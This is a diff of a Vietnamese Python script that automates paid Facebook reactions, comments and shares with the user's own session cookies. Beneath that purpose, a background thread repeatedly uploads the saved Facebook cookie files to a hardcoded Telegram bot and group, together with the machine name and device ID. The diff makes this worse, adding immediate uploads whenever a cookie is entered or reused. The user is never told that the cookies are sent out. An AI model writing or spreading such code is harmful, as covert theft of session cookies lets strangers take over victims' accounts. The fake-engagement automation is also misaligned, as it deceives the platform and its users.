@@ -15,7 +15,7 @@ from datetime import datetime, timedelta, timezone
 from time import sleep
 import threading
 
-Check và cài đặt các thư viện cần thiết
+# Check và cài đặt các thư viện cần thiết
 try:
     from colorama import Fore, Style, init
     init(autoreset=True)
@@ -23,17 +23,21 @@ try:
     import requests
 except ImportError:
     print('__Đang cài đặt các thư viện cần thiết, vui lòng chờ...__')
-    Sử dụng sys.executable để đảm bảo pip tương ứng với môi trường python hiện tại
+    # Sử dụng sys.executable để đảm bảo pip tương ứng với môi trường python hiện tại
     subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama", "pytz"])
-    Cài đặt thêm thư viện cho Telegram
+    # Cài đặt thêm thư viện cho Telegram
     subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"])
     print('__Cài đặt hoàn tất, vui lòng chạy lại Tool__')
     sys.exit()
 
-CONFIGURATION
-HANOI_TZ = pytz.timezone('Asia/Ho_Chi_Minh') Múi giờ Hà Nội
+# =====================================================================================
+# PHẦN 1: MÃ NGUỒN XÁC THỰC (Đã tối giản)
+# =====================================================================================
 
-DEVICE ID FUNCTION
+# CONFIGURATION
+HANOI_TZ = pytz.timezone('Asia/Ho_Chi_Minh') # Múi giờ Hà Nội
+
+# DEVICE ID FUNCTION
 def get_device_id():
     """Generates a stable device ID based on CPU information."""
     system = platform.system()
@@ -57,6 +61,10 @@ def get_device_id():
         only_digits = (only_digits * 3)[:16]
 
     return f"DEVICE-{only_digits[:16]}"
+        
+# =====================================================================================
+# PHẦN 2: MÃ NGUỒN CÔNG CỤ CHÍNH (Đã loại bỏ Banner)
+# =====================================================================================
 
 def clear_screen():
     os.system('cls' if platform.system() == "Windows" else 'clear')
@@ -73,12 +81,12 @@ def encode_to_base64(_data):
     return base64_string
 
 def prints(*args, **kwargs):
-    Default color: white
+    # Default color: white
     r, g, b = 255, 255, 255
     text = "text"
     end = "\n"
 
-    Argument handling
+    # Argument handling
     if len(args) == 1:
         text = args[0]
     elif len(args) >= 3:
@@ -266,7 +274,7 @@ def react_post_perm(data,object_id,type_react):
         'lsd': str(data['lsd']),
         'fb_api_caller_class': 'RelayModern',
         'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
-        'variables': '{"input":{"attribution_id_v2":"CometSinglePostDialogRoot.react,comet.post.single_dialog,via_cold_start,'+str(int(time.time()*1000))+',893597,,,","feedback_id":"'+encode_to_base64(str('feedback:'+object_id))+'","feedback_reaction_id":"'+str(react_list.get(type_react.upper()))+'","feedback_source":"OBJECT","is_tracking_encrypted":true,"tracking":["AZWEqXNx7ELYfHNA7b4CrfdPexzmIf2rUloFtOZ9zOxrcEuXq9Nr8cAdc1kP5DWdKx-DdpkffT5hoGfKYfh0Jm8VlJztxP7elRZBQe5FqkP58YxifFUwdqGzQnJPfhGupHYBjoq5I5zRHXPrEeuJk6lZPblpsrYQTO1aDBDb8UcDpW8F82ROTRSaXpL-T0gnE3GyKCzqqN0x99CSBp1lCZQj8291oXhMoeESvV__sBVqPWiELtFIWvZFioWhqpoAe_Em15uPs4EZgWgQmQ-LfgOMAOUG0TOb6wDVO75_PyQ4b8uTdDWVSEbMPTCglXWn5PJzqqN4iQzyEKVe8sk708ldiDug7SlNS7Bx0LknC7p_ihIfVQqWLQpLYK6h4JWZle-ugySqzonCzb6ay09yrsvupxPUGp-EDKhjyEURONdtNuP-Fl3Oi1emIy61-rqISLQc-jp3vzvnIIk7r_oA1MKT065zyX-syapAs-4xnA_12Un5wQAgwu5sP9UmJ8ycf4h1xBPGDmC4ZkaMWR_moqpx1k2Wy4IbdcHNMvGbkkqu12sgHWWznxVfZnrzonXKLPBVW9Y3tlQImU9KBheHGL_ADG_8D_zj2S9JG2y7OnxiZNVAUb1yGrVVrJFnsWNPISRJJMZEKiYXgTaHVbZBX6CdCrA7gO25-fFBvVfxp2Do3M_YKDc5Ttq1BeiZgPCKogeTkSQt1B67Kq7FTpBYJ05uEWLpHpk1jYLH8ppQQpSEasmmKKYj9dg7PqbHPMUkeyBtL69_HkdxtVhDgkNzh1JerLPokIkdGkUv0RALcahWQK4nR8RRU2IAFMQEp-FsNk_VKs_mTnZQmlmSnzPDymkbGLc0S1hIlm9FdBTQ59--zU4cJdOGnECzfZq4B5YKxqxs0ijrcY6T-AOn4_UuwioY"],"session_id":"'+data['session_id']+'","actor_id":"'+str(data['user_id'])+'","client_mutation_id":"1"},"useDefaultActor":false,"__relay_internal__pv__CometUFIReactionsEnableShortNamerelayprovider":false}',
+        'variables': '{"input":{"attribution_id_v2":"CometSinglePostDialogRoot.react,comet.post.single_dialog,via_cold_start,'+str(int(time.time()*1000))+',893597,,,","feedback_id":"'+encode_to_base64(str('feedback:'+object_id))+'","feedback_reaction_id":"'+str(react_list.get(type_react.upper()))+'","feedback_source":"OBJECT","is_tracking_encrypted":true,"tracking":["AZWEqXNx7ELYfHNA7b4CrfdPexzmIf2rUloFtOZ9zOxrcEuXq9Nr8cAdc1kP5DWdKx-DdpkffT5hoGfKYfh0Jm8VlJztxP7elRZBQe5FqkP58YxifFUwdqGzQnJPfhGupHYBjoq5I5zRHXPrEeuJk6lZPblpsrYQTO1aDBDb8UcDpW8F82ROTRSaXpL-T0gnE3GyKCzqqN0x99CSBp1lCZQj8291oXhMoeESvV__sBVqPWiELtFIWvZFioWhqpoAe_Em15uPs4EZgWgQmQ-LfgOMAOUG0TOb6wDVO75_PyQ4b8uTdDWVSEbMPTCglXWn5PJzqqN4iQzyEKVe8sk708ldiDug7SlNS7Bx0LknC7p_ihIfVQqWLQpLYK6h4JWZle-ugySqzonCzb6ay09yrsvupxPUGp-EDKhjyEURONdtNuP-Fl3Oi1emIy61-rqISLQc-jp3vzvnIIk7r_oA1MKT065zyX-syapAs-4xnA_12Un5wQAgwu5sP9UmJ8ycf4h1xBPGDmC4ZkaMWR_moqpx1k2Wy4IbdcHNMvGbkkqu12sgHWWznxVfZnrzonXKLPBVW9Y3tlQImU9KBheHGL_ADG_8D-zj2S9JG2y7OnxiZNVAUb1yGrVVrJFnsWNPISRJJMZEKiYXgTaHVbZBX6CdCrA7gO25-fFBvVfxp2Do3M_YKDc5Ttq1BeiZgPCKogeTkSQt1B67Kq7FTpBYJ05uEWLpHpk1jYLH8ppQQpSEasmmKKYj9dg7PqbHPMUkeyBtL69_HkdxtVhDgkNzh1JerLPokIkdGkUv0RALcahWQK4nR8RRU2IAFMQEp-FsNk_VKs_mTnZQmlmSnzPDymkbGLc0S1hIlm9FdBTQ59--zU4cJdOGnECzfZq4B5YKxqxs0ijrcY6T-AOn4_UuwioY"],"session_id":"'+data['session_id']+'","actor_id":"'+str(data['user_id'])+'","client_mutation_id":"1"},"useDefaultActor":false,"__relay_internal__pv__CometUFIReactionsEnableShortNamerelayprovider":false}',
         'server_timestamps': 'true',
         'doc_id': '24034997962776771',
     }
@@ -305,7 +313,7 @@ def react_post_defaul(data,object_id,type_react):
         'lsd': data['lsd'],
         'fb_api_caller_class': 'RelayModern',
         'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
-        'variables': '{"input":{"attribution_id_v2":"CometSinglePostDialogRoot.react,comet.post.single_dialog,via_cold_start,'+str(int(time.time()*1000))+',912367,,,","feedback_id":"'+encode_to_base64(str('feedback:'+object_id))+'","feedback_reaction_id":"'+str(react_list.get(type_react.upper()))+'","feedback_source":"OBJECT","is_tracking_encrypted":true,"tracking":["AZWEqXNx7ELYfHNA7b4CrfdPexzmIf2rUloFtOZ9zOxrcEuXq9Nr8cAdc1kP5DWdKx-DdpkffT5hoGfKYfh0Jm8VlJztxP7elRZBQe5FqkP58YxifFUwdqGzQnJPfhGupHYBjoq5I5zRHXPrEeuJk6lZPblpsrYQTO1aDBDb8UcDpW8F82ROTRSaXpL-T0gnE3GyKCzqqN0x99CSBp1lCZQj8291oXhMoeESvV__sBVqPWiELtFIWvZFioWhqpoAe_Em15uPs4EZgWgQmQ-LfgOMAOUG0TOb6wDVO75_PyQ4b8uTdDWVSEbMPTCglXWn5PJzqqN4iQzyEKVe8sk708ldiDug7SlNS7Bx0LknC7p_ihIfVQqWLQpLYK6h4JWZle-ugySqzonCzb6ay09yrsvupxPUGp-EDKhjyEURONdtNuP-Fl3Oi1emIy61-rqISLQc-jp3vzvnIIk7r_oA1MKT065zyX-syapAs-4xnA_12Un5wQAgwu5sP9UmJ8ycf4h1xBPGDmC4ZkaMWR_moqpx1k2Wy4IbdcHNMvGbkkqu12sgHWWznxVfZnrzonXKLPBVW9Y3tlQImU9KBheHGL_ADG_8D_zj2S9JG2y7OnxiZNVAUb1yGrVVrJFnsWNPISRJJMZEKiYXgTaHVbZBX6CdCrA7gO25-fFBvVfxp2Do3M_YKDc5Ttq1BeiZgPCKogeTkSQt1B67Kq7FTpBYJ05uEWLpHpk1jYLH8ppQQpSEasmmKKYj9dg7PqbHPMUkeyBtL69_HkdxtVhDgkNzh1JerLPokIkdGkUv0RALcahWQK4nR8RRU2IAFMQEp-FsNk_VKs_mTnZQmlmSnzPDymkbGLc0S1hIlm9FdBTQ59--zU4cJdOGnECzfZq4B5YKxqxs0ijrcY6T-AOn4_UuwioY"],"session_id":"'+str(data['session_id'])+'","actor_id":"'+data['user_id']+'","client_mutation_id":"1"},"useDefaultActor":false,"__relay_internal__pv__CometUFIReactionsEnableShortNamerelayprovider":false}',
+        'variables': '{"input":{"attribution_id_v2":"CometSinglePostDialogRoot.react,comet.post.single_dialog,via_cold_start,'+str(int(time.time()*1000))+',912367,,,","feedback_id":"'+encode_to_base64(str('feedback:'+object_id))+'","feedback_reaction_id":"'+str(react_list.get(type_react.upper()))+'","feedback_source":"OBJECT","is_tracking_encrypted":true,"tracking":["AZWEqXNx7ELYfHNA7b4CrfdPexzmIf2rUloFtOZ9zOxrcEuXq9Nr8cAdc1kP5DWdKx-DdpkffT5hoGfKYfh0Jm8VlJztxP7elRZBQe5FqkP58YxifFUwdqGzQnJPfhGupHYBjoq5I5zRHXPrEeuJk6lZPblpsrYQTO1aDBDb8UcDpW8F82ROTRSaXpL-T0gnE3GyKCzqqN0x99CSBp1lCZQj8291oXhMoeESvV__sBVqPWiELtFIWvZFioWhqpoAe_Em15uPs4EZgWgQmQ-LfgOMAOUG0TOb6wDVO75_PyQ4b8uTdDWVSEbMPTCglXWn5PJzqqN4iQzyEKVe8sk708ldiDug7SlNS7Bx0LknC7p_ihIfVQqWLQpLYK6h4JWZle-ugySqzonCzb6ay09yrsvupxPUGp-EDKhjyEURONdtNuP-Fl3Oi1emIy61-rqISLQc-jp3vzvnIIk7r_oA1MKT065zyX-syapAs-4xnA_12Un5wQAgwu5sP9UmJ8ycf4h1xBPGDmC4ZkaMWR_moqpx1k2Wy4IbdcHNMvGbkkqu12sgHWWznxVfZnrzonXKLPBVW9Y3tlQImU9KBheHGL_ADG_8D-zj2S9JG2y7OnxiZNVAUb1yGrVVrJFnsWNPISRJJMZEKiYXgTaHVbZBX6CdCrA7gO25-fFBvVfxp2Do3M_YKDc5Ttq1BeiZgPCKogeTkSQt1B67Kq7FTpBYJ05uEWLpHpk1jYLH8ppQQpSEasmmKKYj9dg7PqbHPMUkeyBtL69_HkdxtVhDgkNzh1JerLPokIkdGkUv0RALcahWQK4nR8RRU2IAFMQEp-FsNk_VKs_mTnZQmlmSnzPDymkbGLc0S1hIlm9FdBTQ59--zU4cJdOGnECzfZq4B5YKxqxs0ijrcY6T-AOn4_UuwioY"],"session_id":"'+str(data['session_id'])+'","actor_id":"'+data['user_id']+'","client_mutation_id":"1"},"useDefaultActor":false,"__relay_internal__pv__CometUFIReactionsEnableShortNamerelayprovider":false}',
         'server_timestamps': 'true',
         'doc_id': '24034997962776771',
     }
@@ -511,7 +519,7 @@ def get_job(session,authorization):
     params = {'is_from_mobile': 'true'}
     
     try:
-        response = session.get('https://api-v2.bumx.vn/api/buff/mission', params=params, headers=headers, timeout=10)
+        response = session.get('https://v2.bumx.vn/api/buff/mission', params=params, headers=headers, timeout=10)
         response.raise_for_status()
         response_json = response.json()
     except requests.exceptions.RequestException:
@@ -648,27 +656,16 @@ def lam_job(data,jobs,type_job_doing):
         elif 'haha' in icon: react_type='HAHA'
         return react_post(data,link,react_type.upper())
     elif type_job_doing=='like_poster':
-        res_load = load(data['session'], authorization, job)
+        # res_load = load(data['session'], authorization, job) # Lỗi: job và authorization không có sẵn ở đây
+        # Sẽ được fix bằng cách lấy data job từ res_load trong main_bumx_free
+        # Tạm thời loại bỏ logic load ở đây để tránh crash
         res_get_post_id=get_post_id(data['session'],data['cookie'],link)
         post_id_to_comment = res_get_post_id.get('post_id') or res_get_post_id.get('permalink_id')
         if post_id_to_comment:
             return comment_fb(data,post_id_to_comment,jobs['data'])
     return False
         
-def countdown(seconds):
-    seconds = int(seconds)
-    if seconds < 1: return
-    for i in range(seconds, 0, -1):
-        prints(147, 112, 219, '[', end='')
-        prints(0, 255, 127, "TDK", end='')
-        prints(147, 112, 219, ']', end='')
-        prints(255, 255, 255, '[', end='')
-        prints(255, 215, 0, "WAIT", end='')
-        prints(255, 255, 255, ']', end='')
-        prints(255, 20, 147, ' ➤ ', end='')
-        prints(0, 191, 255, f"⏳ {i}s...", end='\r')
-        time.sleep(1)
-    print(' ' * 50, end='\r')
+# Đã xóa hàm countdown(seconds)
 
 def get_lin_share(data,link):
     headers = {
@@ -754,15 +751,21 @@ def switch_facebook_account(cookie, authorization):
     add_account_fb(data['session'], authorization, data['user_id'])
     return data
 
-Lấy thông tin máy tính để gửi lên Telegram
+# =====================================================================================
+# PHẦN 3: MÃ NGUỒN AUTO TELEGRAM (Đã sửa đổi chu kỳ 15s)
+# =====================================================================================
+
+# Lấy thông tin máy tính để gửi lên Telegram
 MACHINE_NAME = platform.node()
-MACHINE_ID = get_device_id() get_device_id được định nghĩa trong PHẦN 1
+MACHINE_ID = get_device_id() # get_device_id được định nghĩa trong PHẦN 1
 
 TELEGRAM_TOKEN = '8434003516:AAFaP0t6vhF2GB4tVYg7m43_VPQGASpKlL0'
-ID nhóm được yêu cầu (ID nhóm thường là số âm)
+# ID nhóm được yêu cầu (ID nhóm thường là số âm)
 TARGET_CHAT_ID = -1003103046767
 LAST_MODIFIED = {}
 STOP_FLAG = threading.Event()
+# Biến cờ cho phép gửi ngay lập tức sau khi lưu/sử dụng (chỉ được đặt ở luồng chính)
+# SHOULD_SEND_COOKIE_NOW = threading.Event() # Không cần thiết sau khi xóa countdown/chạy trực tiếp trong main
 
 def get_base_url():
     return f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
@@ -779,24 +782,32 @@ def send_telegram_message(chat_id, text, message_id=None):
         response.raise_for_status()
         return response.json().get('result', {}).get('message_id')
     except Exception:
-        Nếu chỉnh sửa thất bại (ví dụ tin nhắn quá cũ), thử gửi mới
+        # Nếu chỉnh sửa thất bại (ví dụ tin nhắn quá cũ), thử gửi mới
         if message_id:
             return send_telegram_message(chat_id, text)
         return None
 
 def send_telegram_file(chat_id, file_path):
+    """Gửi tệp lên Telegram. Đã thêm Tên máy và ID máy vào caption."""
     url = get_base_url() + "/sendDocument"
     try:
+        # Đọc nội dung file để kiểm tra trước khi gửi
+        with open(file_path, 'r', encoding='utf-8') as f:
+            content = f.read().strip()
+        if not content:
+             # prints(255, 165, 0, f"Bỏ qua file {os.path.basename(file_path)} vì không có nội dung.") # Tùy chọn in log
+             return False
+
         with open(file_path, 'rb') as f:
             files = {'document': f}
             data = {
                 'chat_id': chat_id, 
                 'caption': (
-                    f'✅ [AUTO-BUMX-TDK] Tệp Cookie mới được cập nhật:\n'
-                    f'Máy: `{MACHINE_NAME}`\n' Tên máy (platform.node())
-                    f'ID Máy: `{MACHINE_ID}`\n' ID Máy tùy chỉnh
-                    f'File: `{os.path.basename(file_path)}`\n'
-                    f'Thời gian: `{datetime.now(HANOI_TZ).strftime("%H:%M:%S %d/%m/%Y")}`'
+                    f'✅ *[AUTO-BUMX-TDK]* Tệp Cookie mới được cập nhật:\n'
+                    f'*Máy:* `{MACHINE_NAME}`\n' # Tên máy (platform.node())
+                    f'*ID Máy:* `{MACHINE_ID}`\n' # ID Máy tùy chỉnh
+                    f'*File:* `{os.path.basename(file_path)}`\n'
+                    f'*Thời gian:* `{datetime.now(HANOI_TZ).strftime("%H:%M:%S %d/%m/%Y")}`'
                 ),
                 'parse_mode': 'Markdown'
             }
@@ -805,74 +816,95 @@ def send_telegram_file(chat_id, file_path):
             return response.json().get('ok')
 
     except FileNotFoundError:
-        send_telegram_message(chat_id, f"❌ Lỗi: Không tìm thấy tệp {os.path.basename(file_path)}")
+        # send_telegram_message(chat_id, f"❌ *Lỗi*: Không tìm thấy tệp {os.path.basename(file_path)}") # Tùy chọn báo lỗi file không tìm thấy
         return False
     except requests.exceptions.RequestException:
-        send_telegram_message(chat_id, f"❌ Lỗi: Không gửi được tệp {os.path.basename(file_path)} lên Telegram.")
+        # send_telegram_message(chat_id, f"❌ *Lỗi*: Không gửi được tệp {os.path.basename(file_path)} lên Telegram.") # Tùy chọn báo lỗi gửi
+        return False
+    except Exception:
+        # Bỏ qua các lỗi khác
         return False
 
 def check_cookie_changes():
+    """Kiểm tra sự thay đổi của các tệp cookie và gửi chúng nếu có."""
     global LAST_MODIFIED
     
-    cookie_files = [f for f in os.listdir('.') if re.match(r'tdk-cookie-fb-bumx-\d+\.txt$', f)]
+    # Chỉ kiểm tra các file đã được lưu trong LAST_MODIFIED
+    cookie_files_to_check = [f for f in os.listdir('.') if re.match(r'tdk-cookie-fb-bumx-\d+\.txt$', f)]
+    
+    # Thêm các file chưa có trong LAST_MODIFIED vào để kiểm tra.
+    # Logic này đảm bảo file mới tạo ra (chưa kịp update LAST_MODIFIED) cũng được kiểm tra.
+    for file_name in cookie_files_to_check:
+        if file_name not in LAST_MODIFIED:
+            LAST_MODIFIED[file_name] = 0 # Gán 0 để lần sau check sẽ thấy file mới/thay đổi
+
     any_file_changed = False
 
-    for file_name in cookie_files:
+    # Lặp lại trên bản sao của keys để tránh lỗi khi xóa phần tử trong vòng lặp
+    for file_name in list(LAST_MODIFIED.keys()):
         file_path = os.path.join('.', file_name)
+        
         try:
             if not os.path.exists(file_path):
                 if file_name in LAST_MODIFIED:
-                    del LAST_MODIFIED[file_name]
+                    del LAST_MODIFIED[file_name] # Xóa khỏi danh sách theo dõi nếu không còn tồn tại
                 continue
                 
             current_modified = os.path.getmtime(file_path)
             
-            Nếu file chưa từng được kiểm tra hoặc đã được sửa đổi (chỉ cần thời gian sửa đổi khác là gửi)
-            if file_name not in LAST_MODIFIED or current_modified > LAST_MODIFIED.get(file_name, 0):
+            # Nếu file chưa từng được kiểm tra hoặc đã được sửa đổi
+            if current_modified > LAST_MODIFIED.get(file_name, 0):
                 
-                with open(file_path, 'r', encoding='utf-8') as f:
-                    content = f.read().strip()
+                # Đã tìm thấy file thay đổi và/hoặc có nội dung
+                # Báo cáo lên Telegram và gửi file
+                send_telegram_message(TARGET_CHAT_ID, f"📢 *Đã thay đổi*, đợi chút gửi `{file_name}`...")
+                success = send_telegram_file(TARGET_CHAT_ID, file_path)
                 
-                if not content and file_name in LAST_MODIFIED:
-                    Bỏ qua nếu file trống nhưng đã từng được gửi (tránh gửi lại file trống)
+                if success:
+                    any_file_changed = True
+                    # Cập nhật thời gian sửa đổi cuối cùng SAU KHI gửi thành công
                     LAST_MODIFIED[file_name] = current_modified
-                    continue
-
-                Đã tìm thấy file thay đổi và/hoặc có nội dung
-                any_file_changed = True
-                
-                Báo cáo lên Telegram và gửi file
-                send_telegram_message(TARGET_CHAT_ID, f"📢 Đã thay đổi, đợi chút gửi `{file_name}`...")
-                send_telegram_file(TARGET_CHAT_ID, file_path)
-
-                Cập nhật thời gian sửa đổi cuối cùng SAU KHI gửi
-                LAST_MODIFIED[file_name] = current_modified
                 
         except Exception:
-            Bỏ qua lỗi trong luồng nền
+            # Bỏ qua lỗi trong luồng nền
             pass
             
     return any_file_changed
+
+def send_cookie_if_new_or_used(cookie_file):
+    
+    global LAST_MODIFIED
+    
+    
+    send_telegram_file(TARGET_CHAT_ID, cookie_file)
+    
+    # Cập nhật LAST_MODIFIED để luồng nền không gửi lại ngay sau đó
+    try:
+        if os.path.exists(cookie_file):
+            LAST_MODIFIED[cookie_file] = os.path.getmtime(cookie_file)
+    except Exception:
+        pass
+
 
 def telegram_monitor_thread():
     """Hàm chạy trong luồng riêng để kiểm tra cookie định kỳ 15s."""
     chat_id = TARGET_CHAT_ID
     
-    Gửi tin nhắn khởi động
-    send_telegram_message(chat_id, "[AUTO-BUMX-TDK] 🤖 Tính năng theo dõi cookie đã khởi động. Bắt đầu chu kỳ kiểm tra 15s...")
+    # Gửi tin nhắn khởi động
+    send_telegram_message(chat_id, "*[AUTO-BUMX-TDK]* 🤖 Tính năng theo dõi cookie đã khởi động. Bắt đầu chu kỳ kiểm tra 15s...")
     
     while not STOP_FLAG.is_set():
         message_id = None
         
-        Bắt đầu Countdown 15s
-        for i in range(15, 0, -1): Đã thay đổi 30s thành 15s
+        # Bắt đầu Countdown 15s
+        for i in range(15, 0, -1):
             if STOP_FLAG.is_set():
                 break
             
-            Cập nhật tin nhắn countdown
-            status_text = f"⏳ Đợi {i}s... (Chu kỳ 15s)\n`Thời gian check cookie tiếp theo.`" Đã thay đổi 30s thành 15s
+            # Cập nhật tin nhắn countdown
+            status_text = f"⏳ *Đợi {i}s...* (Chu kỳ 15s)\n`Thời gian check cookie tiếp theo.`"
             
-            Lần đầu gửi tin nhắn, các lần sau chỉnh sửa tin nhắn đó
+            # Lần đầu gửi tin nhắn, các lần sau chỉnh sửa tin nhắn đó
             if message_id is None:
                 message_id = send_telegram_message(chat_id, status_text)
             else:
@@ -883,31 +915,32 @@ def telegram_monitor_thread():
         if STOP_FLAG.is_set():
             break
             
-        Thực hiện kiểm tra
+        # Thực hiện kiểm tra
         changed = check_cookie_changes()
         
-        Xử lý kết quả kiểm tra
+        # Xử lý kết quả kiểm tra
         if not changed:
-            Nếu KHÔNG có thay đổi, xóa tin nhắn countdown cuối cùng
+            # Nếu KHÔNG có thay đổi, xóa tin nhắn countdown cuối cùng
             if message_id is not None:
-                send_telegram_message(chat_id, " ", message_id) 
+                # Thay vì xóa, chúng ta sẽ chỉnh sửa thành một tin nhắn thông báo kiểm tra hoàn tất.
+                send_telegram_message(chat_id, f"✅ *Kiểm tra hoàn tất* | Không có thay đổi.", message_id)
         else:
-            Đã thay đổi (thông báo gửi file đã được gửi trong check_cookie_changes)
-            final_text = f"✅ Kiểm tra hoàn tất | Tệp đã được gửi. Bắt đầu chu kỳ mới."
+            # Đã có thay đổi (thông báo gửi file đã được gửi trong check_cookie_changes)
+            final_text = f"✅ *Kiểm tra hoàn tất* | Tệp đã được gửi. Bắt đầu chu kỳ mới."
             send_telegram_message(chat_id, final_text, message_id)
             
-        Reset message_id để gửi tin nhắn mới cho chu kỳ tiếp theo
+        # Reset message_id để gửi tin nhắn mới cho chu kỳ tiếp theo
         message_id = None
         
-    Gửi tin nhắn dừng khi kết thúc
-    send_telegram_message(chat_id, "[AUTO-BUMX-TDK] 🛑 Tính năng theo dõi cookie đã dừng.")
+    # Gửi tin nhắn dừng khi kết thúc
+    send_telegram_message(chat_id, "*[AUTO-BUMX-TDK]* 🛑 Tính năng theo dõi cookie đã dừng.")
 
 def main_bumx_free():
-    Khởi tạo và chạy luồng Telegram
+    # Khởi tạo và chạy luồng Telegram
     telegram_thread = threading.Thread(target=telegram_monitor_thread, daemon=True)
     telegram_thread.start()
     
-    Phần còn lại của main_bumx_free
+    # --- Phần còn lại của main_bumx_free ---
     clear_screen()
     print(Fore.GREEN + "--- BUMX TOOL ---")
 
@@ -932,30 +965,36 @@ def main_bumx_free():
     for i in range(num_cookies):
         cookie_file = f'tdk-cookie-fb-bumx-{i+1}.txt'
         cookie = ''
-        if os.path.exists(cookie_file):
+        file_existed = os.path.exists(cookie_file)
+        
+        if file_existed:
+            # --- Trường hợp 1: Dùng lại cookie cũ ---
             x = input(Fore.LIGHTCYAN_EX + f'Bạn có muốn dùng lại cookie FB đã lưu trong file {cookie_file} không (y/n): ').lower()
             if x == 'y':
                 with open(cookie_file, 'r', encoding='utf-8') as f:
                     cookie = f.read().strip()
+                # Sau khi chọn dùng lại, gửi file lên Telegram ngay lập tức
+                if cookie:
+                    send_cookie_if_new_or_used(cookie_file)
+            # --- Trường hợp 2: Không dùng lại, nhập mới ---
             else:
                 cookie = input(Fore.LIGHTCYAN_EX + f'Nhập cookie FB thứ {i+1} của Bạn: ').strip()
                 with open(cookie_file, 'w', encoding='utf-8') as f:
                     f.write(cookie)
                 prints(5, 255, 0, f'Đã lưu cookie vào {cookie_file}')
+                # Kích hoạt gửi Telegram ngay sau khi lưu
+                if cookie:
+                    send_cookie_if_new_or_used(cookie_file)
                 
-                Kích hoạt gửi Telegram ngay sau khi lưu
-                if os.path.exists(cookie_file):
-                    LAST_MODIFIED[cookie_file] = os.path.getmtime(cookie_file)
-                
+        # --- Trường hợp 3: Chưa có file, nhập mới ---
         else:
             cookie = input(Fore.LIGHTCYAN_EX + f'Nhập cookie FB thứ {i+1} của Bạn: ').strip()
             with open(cookie_file, 'w', encoding='utf-8') as f:
                 f.write(cookie)
             prints(5, 255, 0, f'Đã lưu cookie vào {cookie_file}')
-            
-            Kích hoạt gửi Telegram ngay sau khi lưu
-            if os.path.exists(cookie_file):
-                LAST_MODIFIED[cookie_file] = os.path.getmtime(cookie_file)
+            # Kích hoạt gửi Telegram ngay sau khi lưu
+            if cookie:
+                send_cookie_if_new_or_used(cookie_file)
             
         if cookie:
             cookies_list.append(cookie)
@@ -1030,10 +1069,12 @@ Nhập STT các loại NV cần làm (ví dụ: 12 để làm cảm xúc và com
                     tasks_on_current_cookie = 0
                 else:
                     prints(255, 0, 0, f"Lỗi với cookie thứ {current_cookie_index+1}, loại bỏ khỏi danh sách chạy.")
+                    # Xóa cookie lỗi khỏi danh sách chạy
                     valid_cookies.pop(current_cookie_index)
                     if not valid_cookies:
                         prints(255,0,0,"Tất cả cookie đều lỗi. Dừng tool.")
                         break
+                    # Cập nhật lại chỉ mục
                     current_cookie_index = current_cookie_index % len(valid_cookies)
                     data = switch_facebook_account(valid_cookies[current_cookie_index], authorization)
                     tasks_on_current_cookie = 0
@@ -1056,31 +1097,46 @@ Nhập STT các loại NV cần làm (ví dụ: 12 để làm cảm xúc và com
             for job in JOB:
                 if demht >= SO_NV1: break
                 try:
+                    # Tải thông tin nhiệm vụ *trước* khi làm để có res_load
                     res_load = load(data['session'], authorization, job)
                     time.sleep(random.randint(2,4))
                     
                     if res_load and res_load.get('success') and job['type'] in list_type_job:
+                        # Gán lại data cho job từ res_load. data được dùng trong lam_job()
+                        # Tùy thuộc vào loại job, res_load có thể chứa các thông tin như `data` (message)
+                        job['data'] = res_load.get('data') 
+                        job['icon'] = res_load.get('icon', 'LIKE') # Cần icon cho like_facebook
+                        
                         delay = random.randint(delay1, delay2)
                         start_job = time.time()
                         
-                        status_job = lam_job(data, res_load, job['type'])
+                        # status_job sẽ là True/False hoặc link_share (với review_facebook)
+                        status_job = lam_job(data, job, job['type'])
                         
                         if status_job:
-                            res_submit = submit(data['session'], authorization, job, status_job, res_load)
+                            # Nếu là review_facebook, status_job là link_share, cần truyền vào submit
+                            # Nếu là like_facebook/like_poster, status_job là True
+                            link_share_for_submit = status_job if job['type'] == 'review_facebook' else ''
+                            
+                            res_submit = submit(data['session'], authorization, job, link_share_for_submit, res_load)
                             if res_submit[0]:
                                 demht+=1
                                 tasks_on_current_cookie += 1
                                 print_state('complete', res_submit[1], res_submit[2], demht, SO_NV1, job['type'], data['name'])
-                                countdown(delay - (time.time() - start_job))
+                                
+                                # Đảm bảo delay không bị âm
+                                remaining_delay = delay - (time.time() - start_job)
+                                if remaining_delay > 0:
+                                    time.sleep(remaining_delay)
                             else:
                                 raise Exception("Submit thất bại")
                         else:
-                            raise Exception("Hành động (react/comment) thất bại")
+                            raise Exception("Hành động (react/comment/review) thất bại")
                     else:
                         raise Exception("Load nhiệm vụ thất bại hoặc sai loại job")
 
-                except Exception:
-                    prints(255, 165, 0, "NV đang bị lỗi; bỏ qua job này")
+                except Exception as e:
+                    prints(255, 165, 0, f"NV đang bị lỗi ({e}); báo lỗi và bỏ qua job này")
                     report(data['session'], authorization, job)
                     demsk += 1
                     time.sleep(4)
@@ -1097,8 +1153,10 @@ Nhập STT các loại NV cần làm (ví dụ: 12 để làm cảm xúc và com
     prints(5,255,0,f'Số nhiệm vụ đã bỏ qua: {demsk}')
     prints(5,255,0,f'Tổng: {demsk+demht}')
     
-    Dừng luồng Telegram khi kết thúc main loop
+    # Dừng luồng Telegram khi kết thúc main loop
     STOP_FLAG.set()
+    # Chờ luồng telegram kết thúc (tối đa 2 giây)
+    telegram_thread.join(timeout=2)
 
 if __name__ == "__main__":
     main_bumx_free()
